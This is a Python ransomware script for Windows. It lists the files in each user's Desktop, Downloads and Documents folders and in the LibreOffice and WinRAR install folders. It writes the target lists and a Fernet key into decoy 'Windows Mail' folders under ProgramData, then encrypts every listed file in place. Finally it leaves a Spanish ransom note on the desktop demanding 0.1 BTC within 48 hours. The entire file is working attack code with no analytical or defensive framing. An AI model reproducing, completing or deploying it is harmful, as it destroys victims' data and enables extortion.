import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFernet

#Searching the targets

directory = r'C:\Users'

users = []
for f in os.scandir(directory):
    if not f.name.startswith('.') and f.is_dir() and not f.name == 'Default User':
        users.append(f.path)

for user in users:
    print(user)

target_dirs = [ 'Desktop', 'Downloads', 'Documents' ]
folders = []
for user in users:
    for f in os.scandir(user):
        for target in target_dirs:
            if f.name == target:
                folders.append(f.path)

print()

for folder in folders:
    print(folder)

result = []

for folder in folders:
    for dirpath, dirnames, filenames in os.walk(folder):
        for filename in filenames:
           if filename == 'desktop.ini':
                continue
           if filename .endswith('.lnk'):
                continue
           if not filename [0] .isalpha() and not filename [0] .isdigit():
                continue
           result.append (os.path.join(dirpath, filename))

print(result)

#program scan

directory2 = r'C:\Program Files'

target_dirs2 = ['LibreOffice', 'WinRAR']
folder2 = []
for f in os.scandir(directory2):
    for target2 in target_dirs2:
        if f.name == target2:
            folder2.append(f.path)

for user2 in folder2:
    print(user2)

print()

result2 = []
for folder in folder2:
   for dirpath, dirnames, filenames in os.walk(folder):
       for filename in filenames:
           if filename == 'desktop.ini':
                continue
           if filename == 'license.txt':
                continue
           if filename .endswith('.lnk'):
                continue
           if filename .endswith('.fodt'):
                continue
           if filename .endswith('.html'):
                continue
           if not filename [0] .isalpha() and not filename [0] .isdigit():
                continue
           result2.append (os.path.join(dirpath, filename))

#Creating directories to store crap

mydirlist = [
    r'C:\ProgramData (x86)\WindowsPowerShell (x86)',
    r'C:\ProgramData (x86)\Windows Kits',
    r'C:\ProgramData (x86)\Windows Mail',
    r'C:\ProgramData (x86)\Windows Media Player',
    r'C:\ProgramData (x86)\Windows Multimedia Platform',
] 
for mydir in mydirlist:
    if not os.path.exists(mydir):
        os.makedirs(mydir)

with open(r'C:\ProgramData (x86)\Windows Mail\list.txt', 'w') as f:
    for line in result:
        f.write(f"{line}\n")

with open(r'C:\ProgramData (x86)\Windows Mail\list2.txt', 'w') as f:
    for line in result2:
        f.write(f"{line}\n")

key = Fernet.generate_key()

with open(r'C:\ProgramData (x86)\Windows Mail\thekey.key', 'wb') as f:
    f.write(key)

#Execute attack

for file in result:
    with open (file, 'rb') as f:
        content = f.read()
    content_encripted = Fernet(key).encrypt(content)
    with open (file, 'wb') as f:
        f.write(content_encripted)

for file in result2:
    with open (file, 'rb') as f:
        content = f.read()
    content_encripted = Fernet(key).encrypt(content)
    with open (file, 'wb') as f:
        f.write(content_encripted)

#Leaving a message to the victim

username = os.getlogin()    # Fetch username

#file = open(f'C:\\Users\\{username}\\OneDrive\\Desktop\\AVISO.txt','w')
#file.write('Hemos encriptado todos sus archivos, si quereis desencriptarlos teneis 48 horas para enviar 0.1 BTC a la siguiente direccion XXXXXX de lo contrario seran eliminados, una vez se haya realizado el pago recibireis instrucciones de como desencriptarlos. Muchas gracias por su amable colaboracion ;-)')
#file.close()

file = open(f'C:\\Users\\{username}\\Desktop\\AVISO_ATAQUE.txt','w')
file.write('Hemos encriptado todos sus archivos, si quereis desencriptarlos teneis 48 horas para enviar 0.1 BTC a la siguiente direccion XXXXXX de lo contrario seran eliminados, una vez se haya realizado el pago recibireis instrucciones de como desencriptarlos. Muchas gracias por su amable colaboracion ;-)')
file.close()